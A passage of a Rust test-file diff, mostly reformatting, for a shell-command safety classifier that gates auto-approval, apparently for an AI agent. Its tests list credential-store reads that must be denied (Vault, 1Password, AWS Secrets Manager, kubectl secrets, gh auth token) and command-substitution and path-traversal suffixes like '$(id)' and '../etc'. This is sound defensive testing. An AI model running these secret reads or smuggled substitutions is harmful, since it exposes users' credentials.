-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "--a", "--b", "--c"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["echo", "--a", "--b"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["echo", "--a", "--b", "--c"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn tolerate_unknown_short_denies_unknown_double_dash() {
-        // The whole point of the narrow split: short-tolerance does not
-        // accept --unknown.
-        let spec = load_one(r#"
+#[test]
+fn tolerate_unknown_short_denies_unknown_double_dash() {
+    // The whole point of the narrow split: short-tolerance does not
+    // accept --unknown.
+    let spec = load_one(
+        r#"
             [[command]]
             name = "echo"
             bare = true
             tolerate_unknown_short = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "--evil"]), &spec),
-            Verdict::Denied,
-        );
-        // Single-dash long words still pass.
-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "-help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["echo", "--evil"]), &spec), Verdict::Denied,);
+    // Single-dash long words still pass.
+    assert_eq!(dispatch_spec(&toks(&["echo", "-help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    // Integration: TOML registry rejects unknown flags
+// Integration: TOML registry rejects unknown flags
 
-    /// Whether `spec` is governed by the grep hook at runtime, **following an alias to its
-    /// canonical** — an alias entry carries `behavior: None` but `name = <canonical>`, so an alias
-    /// of grep (`egrep`/`fgrep`/`rgrep`) inherits the same pattern-lenient exemption grep itself
-    /// earns, exactly as the runtime does (it canonicalizes before the behavior lookup). Keyed on
-    /// `BehaviorHook::Grep` SPECIFICALLY, not `hook.is_some()`, so a future hook variant is not
-    /// auto-exempted — it fails the deny-unknown sweeps until consciously vetted.
-    fn is_grep_hook(spec: &CommandSpec) -> bool {
-        TOML_REGISTRY
-            .get(&spec.name)
-            .unwrap_or(spec)
-            .behavior
-            .as_ref()
-            .is_some_and(|b| b.hook == Some(crate::registry::types::BehaviorHook::Grep))
-    }
+/// Whether `spec` is governed by the grep hook at runtime, **following an alias to its
+/// canonical** — an alias entry carries `behavior: None` but `name = <canonical>`, so an alias
+/// of grep (`egrep`/`fgrep`/`rgrep`) inherits the same pattern-lenient exemption grep itself
+/// earns, exactly as the runtime does (it canonicalizes before the behavior lookup). Keyed on
+/// `BehaviorHook::Grep` SPECIFICALLY, not `hook.is_some()`, so a future hook variant is not
+/// auto-exempted — it fails the deny-unknown sweeps until consciously vetted.
+fn is_grep_hook(spec: &CommandSpec) -> bool {
+    TOML_REGISTRY
+        .get(&spec.name)
+        .unwrap_or(spec)
+        .behavior
+        .as_ref()
+        .is_some_and(|b| b.hook == Some(crate::registry::types::BehaviorHook::Grep))
+}
 
-    /// Credential-exposure ratchet (the `vault read` failure mode): a sub whose NAME reads/exposes
-    /// credential material must be `profile = "credential-read"`/`"credential-mint"`, or be
-    /// GRANDFATHERED with a reason (confirmed NOT an exposure). This is the guard that would have
-    /// caught `vault read` — it makes the class a finite, enforced worklist for the every-command
-    /// re-research: the grandfather set only SHRINKS, and a NEW smelling sub fails the build.
-    #[test]
-    fn credential_smelling_subs_are_classified_or_grandfathered() {
-        use super::types::{DispatchKind, SubSpec};
-        fn smells(name: &str) -> bool {
-            let n = name.to_ascii_lowercase();
-            // Unambiguous credential-material tokens. NOTE (#3): a bare "key" is deliberately EXCLUDED —
-            // it is too noisy (keyring/keyvault/keyspace/key-handle are benign) to enforce as a ratchet.
-            // Key-material reads that don't hit these tokens (az `account keys`, `admin-key`) are caught
-            // instead by the STRUCTURAL layer (credential subgroups excluded when nesting, per the
-            // reference sweep) — a name heuristic can't be the whole story. See
-            // docs/design/behavioral-taxonomy-archetypes.md (credential detection).
-            [
-                "token", "secret", "password", "credential", "private-key", "access-key", "apikey",
-                "connection-string", "auth-string",
-            ]
+/// Credential-exposure ratchet (the `vault read` failure mode): a sub whose NAME reads/exposes
+/// credential material must be `profile = "credential-read"`/`"credential-mint"`, or be
+/// GRANDFATHERED with a reason (confirmed NOT an exposure). This is the guard that would have
+/// caught `vault read` — it makes the class a finite, enforced worklist for the every-command
+/// re-research: the grandfather set only SHRINKS, and a NEW smelling sub fails the build.
+#[test]
+fn credential_smelling_subs_are_classified_or_grandfathered() {
+    use super::types::{DispatchKind, SubSpec};
+    fn smells(name: &str) -> bool {
+        let n = name.to_ascii_lowercase();
+        // Unambiguous credential-material tokens. NOTE (#3): a bare "key" is deliberately EXCLUDED —
+        // it is too noisy (keyring/keyvault/keyspace/key-handle are benign) to enforce as a ratchet.
+        // Key-material reads that don't hit these tokens (az `account keys`, `admin-key`) are caught
+        // instead by the STRUCTURAL layer (credential subgroups excluded when nesting, per the
+        // reference sweep) — a name heuristic can't be the whole story. See
+        // docs/design/behavioral-taxonomy-archetypes.md (credential detection).
+        ["token", "secret", "password", "credential", "private-key", "access-key", "apikey", "connection-string", "auth-string"]
             .iter()
             .any(|p| n.contains(p))
-        }
-        // Post-batch-0 worklist. Only SHRINKS as re-research classifies each; a NEW smelling sub that
-        // is neither here nor profile=credential-* FAILS the build. (`aws export-credentials`,
-        // `security find-*-password`, `gcloud auth print-*-token`, `vault read` are now
-        // profile=credential-read and no longer here.)
-        const GRANDFATHERED: &[(&str, &str)] = &[
-            // (a) CONFIRMED NOT an exposure — permanent, with reason:
-            ("caddy", "hash-password"),           // bcrypt-hashes an input; exposes no stored secret
-            ("platform", "auth:api-token-login"), // logs in USING a supplied token (consumes, ≠ exposes)
-            ("upsun", "auth:api-token-login"),    // same — token-based login, not a credential read
-            ("please", "static:recache-token"),   // Laravel: regenerates a cache token (mutate, no read)
-            ("rails", "secret"),                  // GENERATES a random secret_key_base (like openssl rand)
-            ("rake", "secret"),                   // same generator via rake
-            ("koyeb", "secret"),                  // group; secrets are write-only, get/list = metadata
-            ("koyeb", "secrets"),                 // alias of the above
-            ("wrangler", "secret"),               // group; CF secrets are write-only, `list` = names only
-            ("clever", "tokens"),                 // group; `create` is candidate (denied), rest = metadata
-            ("dcli", "credentials"),              // `dcli team credentials` = team credential-SHARING audit
-                                                  //   metadata; does NOT reveal vault secret values (docs)
-            ("supabase", "secrets"),              // group; `secrets list` = name + SHA-256 DIGEST only
-                                                  //   (mgmt API never returns plaintext, verified); set/unset = mutate
-            // (b) GROUP NAME contains a credential word, but its value-reading action is now CLOSED by
-            //     narrowing the first_arg glob (Batch 1 restructures into explicit sub-subs):
-            // aws secretsmanager (Batch 1): the describe-*/list-* glob became explicit sub-subs, so
-            // the metadata reads are now visible to this guard by name. Each is confirmed by the API
-            // reference to return METADATA only — the value requires GetSecretValue, which is
-            // profiled credential-read (as is batch-get-secret-value). The group name stays listed
-            // because it, too, merely contains a credential word.
-            ("aws", "secretsmanager"),            // group name only; every value-returning op is classified
-            ("aws", "describe-secret"),           // ARN/name/rotation/tags/version stages — no SecretString
-            ("aws", "list-secrets"),              // secret metadata list; API never returns values
-            ("aws", "list-secret-version-ids"),   // version ids + staging labels; no value
-            // gcloud `secrets` (Batch 1): first_arg glob replaced with explicit sub-subs — metadata
-            // reads are profiled remote-read, and `versions access` (the only payload-returning
-            // action) is profiled credential-read rather than merely omitted from a list.
-            ("gcloud", "secrets"),                // group name only; the payload read is classified
-            // (Batch-0 TODOs now CLASSIFIED, so gone from here: basecamp `auth token` -> credential-read;
-            //  istioctl `proxy-config secret` -> credential-read.)
-        ];
-        fn collect(cmd: &str, kind: &DispatchKind, out: &mut Vec<(String, String)>) {
-            let subs: &[SubSpec] = match kind {
-                DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
-                _ => return,
-            };
-            for sub in subs {
-                let classified = sub.profile.as_deref().is_some_and(|p| p.starts_with("credential-"));
-                if smells(&sub.name) && !classified {
-                    out.push((cmd.to_string(), sub.name.clone()));
-                }
-                collect(cmd, &sub.kind, out);
+    }
+    // Post-batch-0 worklist. Only SHRINKS as re-research classifies each; a NEW smelling sub that
+    // is neither here nor profile=credential-* FAILS the build. (`aws export-credentials`,
+    // `security find-*-password`, `gcloud auth print-*-token`, `vault read` are now
+    // profile=credential-read and no longer here.)
+    const GRANDFATHERED: &[(&str, &str)] = &[
+        // (a) CONFIRMED NOT an exposure — permanent, with reason:
+        ("caddy", "hash-password"),           // bcrypt-hashes an input; exposes no stored secret
+        ("platform", "auth:api-token-login"), // logs in USING a supplied token (consumes, ≠ exposes)
+        ("upsun", "auth:api-token-login"),    // same — token-based login, not a credential read
+        ("please", "static:recache-token"),   // Laravel: regenerates a cache token (mutate, no read)
+        ("rails", "secret"),                  // GENERATES a random secret_key_base (like openssl rand)
+        ("rake", "secret"),                   // same generator via rake
+        ("koyeb", "secret"),                  // group; secrets are write-only, get/list = metadata
+        ("koyeb", "secrets"),                 // alias of the above
+        ("wrangler", "secret"),               // group; CF secrets are write-only, `list` = names only
+        ("clever", "tokens"),                 // group; `create` is candidate (denied), rest = metadata
+        ("dcli", "credentials"),              // `dcli team credentials` = team credential-SHARING audit
+        //   metadata; does NOT reveal vault secret values (docs)
+        ("supabase", "secrets"), // group; `secrets list` = name + SHA-256 DIGEST only
+        //   (mgmt API never returns plaintext, verified); set/unset = mutate
+        // (b) GROUP NAME contains a credential word, but its value-reading action is now CLOSED by
+        //     narrowing the first_arg glob (Batch 1 restructures into explicit sub-subs):
+        // aws secretsmanager (Batch 1): the describe-*/list-* glob became explicit sub-subs, so
+        // the metadata reads are now visible to this guard by name. Each is confirmed by the API
+        // reference to return METADATA only — the value requires GetSecretValue, which is
+        // profiled credential-read (as is batch-get-secret-value). The group name stays listed
+        // because it, too, merely contains a credential word.
+        ("aws", "secretsmanager"),          // group name only; every value-returning op is classified
+        ("aws", "describe-secret"),         // ARN/name/rotation/tags/version stages — no SecretString
+        ("aws", "list-secrets"),            // secret metadata list; API never returns values
+        ("aws", "list-secret-version-ids"), // version ids + staging labels; no value
+        // gcloud `secrets` (Batch 1): first_arg glob replaced with explicit sub-subs — metadata
+        // reads are profiled remote-read, and `versions access` (the only payload-returning
+        // action) is profiled credential-read rather than merely omitted from a list.
+        ("gcloud", "secrets"), // group name only; the payload read is classified
+                               // (Batch-0 TODOs now CLASSIFIED, so gone from here: basecamp `auth token` -> credential-read;
+                               //  istioctl `proxy-config secret` -> credential-read.)
+    ];
+    fn collect(cmd: &str, kind: &DispatchKind, out: &mut Vec<(String, String)>) {
+        let subs: &[SubSpec] = match kind {
+            DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
+            _ => return,
+        };
+        for sub in subs {
+            let classified = sub.profile.as_deref().is_some_and(|p| p.starts_with("credential-"));
+            if smells(&sub.name) && !classified {
+                out.push((cmd.to_string(), sub.name.clone()));
             }
+            collect(cmd, &sub.kind, out);
         }
-        let mut found = Vec::new();
-        for (cmd, spec) in TOML_REGISTRY.iter() {
-            collect(cmd, &spec.kind, &mut found);
-        }
-        found.sort();
-        found.dedup();
-        let violations: Vec<_> = found
-            .into_iter()
-            .filter(|(c, s)| !GRANDFATHERED.iter().any(|(gc, gs)| gc == c && gs == s))
-            .collect();
-        assert!(
-            violations.is_empty(),
-            "credential-smelling subs neither classified (profile=credential-*) nor grandfathered — \
+    }
+    let mut found = Vec::new();
+    for (cmd, spec) in TOML_REGISTRY.iter() {
+        collect(cmd, &spec.kind, &mut found);
+    }
+    found.sort();
+    found.dedup();
+    let violations: Vec<_> = found
+        .into_iter()
+        .filter(|(c, s)| !GRANDFATHERED.iter().any(|(gc, gs)| gc == c && gs == s))
+        .collect();
+    assert!(
+        violations.is_empty(),
+        "credential-smelling subs neither classified (profile=credential-*) nor grandfathered — \
              the vault-read failure mode. Classify or grandfather each:\n{violations:#?}",
+    );
+}
+
+/// Every `per_database` sub answers the same for its variants as for itself, and the suffix
+/// is not a hole.
+///
+/// Rails 8 defaults to four databases (solid_cache, solid_queue, solid_cable), so rake emits a
+/// per-database variant of each schema task — `db:migrate:primary`, `db:create:cache`,
+/// `db:drop:queue`. All 56 were denied while the bare task allowed. The suffix is a key from
+/// the app's own `config/database.yml`, so it cannot be enumerated; the rule is that the
+/// variant is strictly narrower than the base and inherits its classification.
+///
+/// Enumerated over the registry rather than over a list of Rails tasks, so a sub that opts in
+/// later is held to the same contract without anyone remembering this test.
+#[test]
+fn a_per_database_variant_matches_its_base_and_nothing_else() {
+    fn collect(cmd: &str, kind: &DispatchKind, out: &mut Vec<(String, String)>) {
+        let subs: &[super::types::SubSpec] = match kind {
+            DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
+            _ => return,
+        };
+        for sub in subs {
+            if sub.name_match == super::types::NameMatch::WithDatabaseSuffix {
+                out.push((cmd.to_string(), sub.name.clone()));
+            }
+            collect(cmd, &sub.kind, out);
+        }
+    }
+    let mut opted_in = Vec::new();
+    for (cmd, spec) in TOML_REGISTRY.iter() {
+        collect(cmd, &spec.kind, &mut opted_in);
+    }
+    // Eleven subs carry `per_database`; six reach the runtime registry. The other five are
+    // `candidate = true` (db:drop, db:rollback, db:reset, db:migrate:redo, db:migrate:reset),
+    // which is a compile-time marker for "above the line" and never becomes a runtime sub — so
+    // the flag is inert on them and their variants deny as unknown subs, which is the answer
+    // we want anyway. They keep the marking because the variants DO exist upstream, and if a
+    // base is ever reclassified its variants should follow without a second edit.
+    //
+    // `db:migrate` is deliberately NOT among them, which is why `db:migrate:primary` — the
+    // most common variant of all — still denies. It prefixes `db:migrate:redo`/`:reset`/
+    // `:status`, so a suffix cannot be told from a subtask name; `filter_candidates` refuses
+    // the marking outright. See TODO.md.
+    assert!(opted_in.len() >= 6, "only {} per_database subs found — the registry walk is wrong", opted_in.len());
+    // `db:migrate`'s four variants are ENUMERATED rather than rule-matched, because that one
+    // task prefixes three others. Asserted here so the two mechanisms are held to the same
+    // outcome, and so deleting the enumeration is caught.
+    for db in ["primary", "cache", "queue", "cable"] {
+        assert!(
+            crate::command_verdict(&format!("rails db:migrate:{db}")).is_allowed(),
+            "`rails db:migrate:{db}` is a per-database migrate and must classify as db:migrate"
+        );
+    }
+    // …and the sibling TASKS that make the rule unsound for db:migrate must stay denied. If
+    // someone ever gets `per_database` onto db:migrate past the build check, this fails.
+    for task in ["db:migrate:redo", "db:migrate:reset"] {
+        assert_eq!(
+            crate::command_verdict(&format!("rails {task}")),
+            crate::verdict::Verdict::Denied,
+            "`rails {task}` is a destructive subtask, not a database name"
         );
     }
 
-    /// Every `per_database` sub answers the same for its variants as for itself, and the suffix
-    /// is not a hole.
-    ///
-    /// Rails 8 defaults to four databases (solid_cache, solid_queue, solid_cable), so rake emits a
-    /// per-database variant of each schema task — `db:migrate:primary`, `db:create:cache`,
-    /// `db:drop:queue`. All 56 were denied while the bare task allowed. The suffix is a key from
-    /// the app's own `config/database.yml`, so it cannot be enumerated; the rule is that the
-    /// variant is strictly narrower than the base and inherits its classification.
-    ///
-    /// Enumerated over the registry rather than over a list of Rails tasks, so a sub that opts in
-    /// later is held to the same contract without anyone remembering this test.
-    #[test]
-    fn a_per_database_variant_matches_its_base_and_nothing_else() {
-        fn collect(cmd: &str, kind: &DispatchKind, out: &mut Vec<(String, String)>) {
-            let subs: &[super::types::SubSpec] = match kind {
-                DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
-                _ => return,
-            };
-            for sub in subs {
-                if sub.name_match == super::types::NameMatch::WithDatabaseSuffix {
-                    out.push((cmd.to_string(), sub.name.clone()));
-                }
-                collect(cmd, &sub.kind, out);
-            }
-        }
-        let mut opted_in = Vec::new();
-        for (cmd, spec) in TOML_REGISTRY.iter() {
-            collect(cmd, &spec.kind, &mut opted_in);
-        }
-        // Eleven subs carry `per_database`; six reach the runtime registry. The other five are
-        // `candidate = true` (db:drop, db:rollback, db:reset, db:migrate:redo, db:migrate:reset),
-        // which is a compile-time marker for "above the line" and never becomes a runtime sub — so
-        // the flag is inert on them and their variants deny as unknown subs, which is the answer
-        // we want anyway. They keep the marking because the variants DO exist upstream, and if a
-        // base is ever reclassified its variants should follow without a second edit.
-        //
-        // `db:migrate` is deliberately NOT among them, which is why `db:migrate:primary` — the
-        // most common variant of all — still denies. It prefixes `db:migrate:redo`/`:reset`/
-        // `:status`, so a suffix cannot be told from a subtask name; `filter_candidates` refuses
-        // the marking outright. See TODO.md.
-        assert!(
-            opted_in.len() >= 6,
-            "only {} per_database subs found — the registry walk is wrong",
-            opted_in.len()
+    // The candidate half, asserted directly since the walk cannot see it.
+    for denied in ["db:drop:cache", "db:rollback:primary", "db:reset:queue"] {
+        assert_eq!(
+            crate::command_verdict(&format!("rails {denied}")),
+            crate::verdict::Verdict::Denied,
+            "`rails {denied}` must stay denied with its base"
         );
-        // `db:migrate`'s four variants are ENUMERATED rather than rule-matched, because that one
-        // task prefixes three others. Asserted here so the two mechanisms are held to the same
-        // outcome, and so deleting the enumeration is caught.
-        for db in ["primary", "cache", "queue", "cable"] {
-            assert!(
-                crate::command_verdict(&format!("rails db:migrate:{db}")).is_allowed(),
-                "`rails db:migrate:{db}` is a per-database migrate and must classify as db:migrate"
-            );
-        }
-        // …and the sibling TASKS that make the rule unsound for db:migrate must stay denied. If
-        // someone ever gets `per_database` onto db:migrate past the build check, this fails.
-        for task in ["db:migrate:redo", "db:migrate:reset"] {
-            assert_eq!(
-                crate::command_verdict(&format!("rails {task}")),
-                crate::verdict::Verdict::Denied,
-                "`rails {task}` is a destructive subtask, not a database name"
-            );
-        }
-
-        // The candidate half, asserted directly since the walk cannot see it.
-        for denied in ["db:drop:cache", "db:rollback:primary", "db:reset:queue"] {
-            assert_eq!(
-                crate::command_verdict(&format!("rails {denied}")),
-                crate::verdict::Verdict::Denied,
-                "`rails {denied}` must stay denied with its base"
-            );
-        }
-
-        for (cmd, base) in &opted_in {
-            let bare = crate::command_verdict(&format!("{cmd} {base}"));
-            // A real database name inherits the base's answer, whatever that answer is: an
-            // allowed base stays allowed and a denied one (db:drop, db:rollback) stays denied.
-            for db in ["primary", "cache", "queue", "cable", "analytics", "reporting_2"] {
-                assert_eq!(
-                    crate::command_verdict(&format!("{cmd} {base}:{db}")),
-                    bare,
-                    "`{cmd} {base}:{db}` must classify as `{cmd} {base}`"
-                );
-            }
-            // …and the suffix is ONE plain identifier, not "anything after a colon". A
-            // substitution reaches dispatch already rewritten to the CMDSUB sentinel, which is
-            // alphanumeric-and-underscore and passed the character test on its own — so an opaque
-            // value must be rejected explicitly or `db:migrate:$(x)` rides in as a variant.
-            for hostile in ["$(id)", "`id`", "$DB", "../etc", "a/b", "nope:extra", ""] {
-                assert_eq!(
-                    crate::command_verdict(&format!("{cmd} {base}:{hostile}")),
-                    crate::verdict::Verdict::Denied,
-                    "`{cmd} {base}:{hostile}` is not a database name and must not inherit the base"
-                );
-            }
-        }
     }
 
-    /// Credential-EXPOSURE corpus ratchet — the ARGUMENT-layer complement to
-    /// `credential_smelling_subs_are_classified_or_grandfathered` (which guards sub NAMES). A
-    /// secret-store read whose credential signal lives in the ARGUMENT (`vault kv get secret/x`) or in
-    /// the tool's whole purpose (`op item get`) is invisible to the name guard, and CANNOT be found
-    /// generatively: a blind `<read-verb> <secret-word>` probe is vacuous — every positional-accepting
-    /// sub auto-approves `show secret` (a revision literally named "secret"), 1855 false hits. So the
-    /// sweep is necessarily a CURATED, researched worklist of credential reads that MUST deny; it only
-    /// grows as secret-store CLIs are researched, and a gate silently reverting to auto-approve fails
-    /// here. See docs/design/behavioral-taxonomy-archetypes.md (credential detection).
-    #[test]
-    fn credential_store_reads_are_denied() {
-        const MUST_DENY: &[&str] = &[
-            // 1Password (whole tool is a secret store; item/document get + read return secret material)
-            "op item get login",
-            "op read op://vault/item/field",
-            "op document get key.pem",
-            // HashiCorp Vault (read + the KV-v2 sugar kv get)
-            "vault read secret/data/x",
-            "vault kv get secret/x",
-            // AWS (explicit secret/token subs; the get-*/describe-* globs must exclude these)
-            "aws secretsmanager get-secret-value --secret-id x",
-            "aws ecr get-login-password",
-            "aws sts get-session-token",
-            "aws ssm get-parameter --name x --with-decryption",
-            // GCP
-            "gcloud secrets versions access latest --secret=x",
-            "gcloud auth print-access-token",
-            "gcloud auth print-identity-token",
-            // Azure
-            "az keyvault secret show --name x --vault-name v",
-            // Kubernetes (`get secret -o yaml/json` dumps the base64 `data`). The credential_first_arg
-            // mechanism gates every name form: exact, the slash shorthand, qualified, and flag-first.
-            "kubectl get secret db-creds -o yaml",
-            "kubectl get secrets",
-            "kubectl get secret/db-creds -o yaml",
-            "kubectl get -o yaml secret db-creds",
-            // AWS stored credentials via the config store (value-dependent on the key)
-            "aws configure get aws_secret_access_key",
-            "aws configure get aws_session_token",
-            // Password managers / secret stores (retrieval subs return secret material)
-            "bw get password github",
-            "bw list items",
-            "pass show email/work",
-            "pass grep AWS_SECRET",
-            "heroku config",
-            // credential-minting / password stores
-            "gh auth token",
-            "doctl auth init",
-            "security find-internet-password -s example.com",
-        ];
-        let leaks: Vec<_> = MUST_DENY.iter().filter(|c| crate::is_safe_command(c)).collect();
-        assert!(
-            leaks.is_empty(),
-            "credential-store reads AUTO-APPROVING (secret disclosure to the caller's context) — each \
+    for (cmd, base) in &opted_in {
+        let bare = crate::command_verdict(&format!("{cmd} {base}"));
+        // A real database name inherits the base's answer, whatever that answer is: an
+        // allowed base stays allowed and a denied one (db:drop, db:rollback) stays denied.
+        for db in ["primary", "cache", "queue", "cable", "analytics", "reporting_2"] {
+            assert_eq!(crate::command_verdict(&format!("{cmd} {base}:{db}")), bare, "`{cmd} {base}:{db}` must classify as `{cmd} {base}`");
+        }
+        // …and the suffix is ONE plain identifier, not "anything after a colon". A
+        // substitution reaches dispatch already rewritten to the CMDSUB sentinel, which is
+        // alphanumeric-and-underscore and passed the character test on its own — so an opaque
+        // value must be rejected explicitly or `db:migrate:$(x)` rides in as a variant.
+        for hostile in ["$(id)", "`id`", "$DB", "../etc", "a/b", "nope:extra", ""] {
+            assert_eq!(
+                crate::command_verdict(&format!("{cmd} {base}:{hostile}")),
+                crate::verdict::Verdict::Denied,
+                "`{cmd} {base}:{hostile}` is not a database name and must not inherit the base"
+            );
+        }
+    }
+}
+
+/// Credential-EXPOSURE corpus ratchet — the ARGUMENT-layer complement to
+/// `credential_smelling_subs_are_classified_or_grandfathered` (which guards sub NAMES). A
+/// secret-store read whose credential signal lives in the ARGUMENT (`vault kv get secret/x`) or in
+/// the tool's whole purpose (`op item get`) is invisible to the name guard, and CANNOT be found
+/// generatively: a blind `<read-verb> <secret-word>` probe is vacuous — every positional-accepting
+/// sub auto-approves `show secret` (a revision literally named "secret"), 1855 false hits. So the
+/// sweep is necessarily a CURATED, researched worklist of credential reads that MUST deny; it only
+/// grows as secret-store CLIs are researched, and a gate silently reverting to auto-approve fails
+/// here. See docs/design/behavioral-taxonomy-archetypes.md (credential detection).
+#[test]
+fn credential_store_reads_are_denied() {
+    const MUST_DENY: &[&str] = &[
+        // 1Password (whole tool is a secret store; item/document get + read return secret material)
+        "op item get login",
+        "op read op://vault/item/field",
+        "op document get key.pem",
+        // HashiCorp Vault (read + the KV-v2 sugar kv get)
+        "vault read secret/data/x",
+        "vault kv get secret/x",
+        // AWS (explicit secret/token subs; the get-*/describe-* globs must exclude these)
+        "aws secretsmanager get-secret-value --secret-id x",
+        "aws ecr get-login-password",
+        "aws sts get-session-token",
+        "aws ssm get-parameter --name x --with-decryption",
+        // GCP
+        "gcloud secrets versions access latest --secret=x",
+        "gcloud auth print-access-token",
+        "gcloud auth print-identity-token",
+        // Azure
+        "az keyvault secret show --name x --vault-name v",
+        // Kubernetes (`get secret -o yaml/json` dumps the base64 `data`). The credential_first_arg
+        // mechanism gates every name form: exact, the slash shorthand, qualified, and flag-first.
+        "kubectl get secret db-creds -o yaml",
+        "kubectl get secrets",
+        "kubectl get secret/db-creds -o yaml",
+        "kubectl get -o yaml secret db-creds",
+        // AWS stored credentials via the config store (value-dependent on the key)
+        "aws configure get aws_secret_access_key",
+        "aws configure get aws_session_token",
+        // Password managers / secret stores (retrieval subs return secret material)
+        "bw get password github",
+        "bw list items",
+        "pass show email/work",
+        "pass grep AWS_SECRET",
+        "heroku config",
+        // credential-minting / password stores
+        "gh auth token",
+        "doctl auth init",
+        "security find-internet-password -s example.com",
+    ];
+    let leaks: Vec<_> = MUST_DENY.iter().filter(|c| crate::is_safe_command(c)).collect();
+    assert!(
+        leaks.is_empty(),
+        "credential-store reads AUTO-APPROVING (secret disclosure to the caller's context) — each \
              must deny (classify the sub `profile = \"credential-read\"`/`\"credential-mint\"`, or narrow \
              the read-verb glob to exclude the credential action):\n{leaks:#?}",
-        );
+    );
+}
+
+/// The `credential_first_arg` mechanism (dispatch_branching): a first-positional glob classifies
+/// the invocation as a credential-read (deny) while every other value falls through the allow-glob.
+/// Guards the value-dependent credential class — every NAME FORM of the secret resource denies
+/// (exact, plural, slash shorthand, qualified, flag-first), and lookalike/other resources allow.
+#[test]
+fn credential_first_arg_gates_every_secret_name_form() {
+    for c in [
+        "kubectl get secret db -o yaml", "kubectl get secrets", "kubectl get secret/db -o yaml", "kubectl get secrets/db",
+        "kubectl get secret.v1.core db", "kubectl get -o yaml secret db", "kubectl get -n prod secret db",
+        "aws configure get aws_secret_access_key", "aws configure get aws_session_token",
+        // kubectl resource kinds are case-INSENSITIVE upstream (`get Secret` reads secrets), so
+        // every case-variant must deny too — matched via `secret`/`first_arg=["*"]` otherwise.
+        "kubectl get Secret db -o yaml", "kubectl get SECRET", "kubectl get Secrets", "kubectl get Secret/db -o yaml",
+        "kubectl get SECRET.v1.core db", "aws configure get AWS_SECRET_ACCESS_KEY",
+    ] {
+        assert!(!crate::is_safe_command(c), "credential first-arg must deny: {c}");
     }
-
-    /// The `credential_first_arg` mechanism (dispatch_branching): a first-positional glob classifies
-    /// the invocation as a credential-read (deny) while every other value falls through the allow-glob.
-    /// Guards the value-dependent credential class — every NAME FORM of the secret resource denies
-    /// (exact, plural, slash shorthand, qualified, flag-first), and lookalike/other resources allow.
-    #[test]
-    fn credential_first_arg_gates_every_secret_name_form() {
-        for c in [
-            "kubectl get secret db -o yaml",
-            "kubectl get secrets",
-            "kubectl get secret/db -o yaml",
-            "kubectl get secrets/db",
-            "kubectl get secret.v1.core db",
-            "kubectl get -o yaml secret db",
-            "kubectl get -n prod secret db",
-            "aws configure get aws_secret_access_key",
-            "aws configure get aws_session_token",
-            // kubectl resource kinds are case-INSENSITIVE upstream (`get Secret` reads secrets), so
-            // every case-variant must deny too — matched via `secret`/`first_arg=["*"]` otherwise.
-            "kubectl get Secret db -o yaml",
-            "kubectl get SECRET",
-            "kubectl get Secrets",
-            "kubectl get Secret/db -o yaml",
-            "kubectl get SECRET.v1.core db",
-            "aws configure get AWS_SECRET_ACCESS_KEY",
-        ] {
-            assert!(!crate::is_safe_command(c), "credential first-arg must deny: {c}");
-        }
-        for c in [
-            "kubectl get pods",
-            "kubectl get mycustomresource",
-            "kubectl get secretstore db", // a CRD whose name merely starts with "secret" — not gated
-            "kubectl get SecretStore db", // …and the case-insensitive deny must not over-gate it
-            "kubectl get pod my-pod -o yaml",
-            "aws configure get region",
-            "aws configure get output",
-        ] {
-            assert!(crate::is_safe_command(c), "non-credential resource/key must allow: {c}");
-        }
+    for c in [
+        "kubectl get pods", "kubectl get mycustomresource",
+        "kubectl get secretstore db", // a CRD whose name merely starts with "secret" — not gated
+        "kubectl get SecretStore db", // …and the case-insensitive deny must not over-gate it
+        "kubectl get pod my-pod -o yaml", "aws configure get region", "aws configure get output",
+    ] {
+        assert!(crate::is_safe_command(c), "non-credential resource/key must allow: {c}");
     }
+}
 
-    /// Decrypt-to-screen — a top-level `[[command.flag]] classifies="decrypt-read"` or a sub
-    /// `profile="decrypt-read"` — must (1) DENY at the auto-approve band, so a decrypted secret never
-    /// silently enters the model's context, and (2) resolve to a `secret = reads` capability (the
-    /// yolo-only credential tier, reachable only above local-admin — the user's "not below local
-    /// admin" rule). Walks the registry, so a NEW decrypt tool is covered the instant it declares the
-    /// classification. Original bug class: `sops -d`, `age -d`, `ansible-vault view`, and the
-    /// `sops decrypt` subcommand each auto-approved before this.
-    #[test]
-    fn decrypt_read_denies_at_the_band_and_is_a_secret_read() {
-        use crate::engine::facet::SecretLevel;
+/// Decrypt-to-screen — a top-level `[[command.flag]] classifies="decrypt-read"` or a sub
+/// `profile="decrypt-read"` — must (1) DENY at the auto-approve band, so a decrypted secret never
+/// silently enters the model's context, and (2) resolve to a `secret = reads` capability (the
+/// yolo-only credential tier, reachable only above local-admin — the user's "not below local
+/// admin" rule). Walks the registry, so a NEW decrypt tool is covered the instant it declares the
+/// classification. Original bug class: `sops -d`, `age -d`, `ansible-vault view`, and the
+/// `sops decrypt` subcommand each auto-approved before this.
+#[test]
+fn decrypt_read_denies_at_the_band_and_is_a_secret_read() {
+    use crate::engine::facet::SecretLevel;
 
-        fn collect_decrypt_sub_paths(prefix: &str, kind: &DispatchKind, out: &mut Vec<String>) {
-            let subs = match kind {
-                DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
-                _ => return,
-            };
-            for s in subs {
-                let path = format!("{prefix} {}", s.name);
-                // A sub classified as decrypt-read by its base `profile` (`sops decrypt`)...
-                if s.profile.as_deref() == Some("decrypt-read") {
-                    out.push(path.clone());
-                }
-                // ...or by an escalating flag on a bimodal sub (`openssl enc -d`).
-                for f in &s.flags {
-                    if f.classifies == "decrypt-read" {
-                        out.push(format!("{path} {}", f.name));
-                    }
-                }
-                collect_decrypt_sub_paths(&path, &s.kind, out);
-            }
-        }
-
